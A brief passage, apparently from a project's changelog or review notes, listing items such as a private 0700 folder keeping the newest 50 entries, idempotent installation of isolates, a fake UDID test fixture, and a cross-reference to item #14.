  a 0700 folder, newest 50 kept; every isolate rooted in our entry is installed (idempotent); fake UDID fixture (C, V).
- **#14** see above (P).
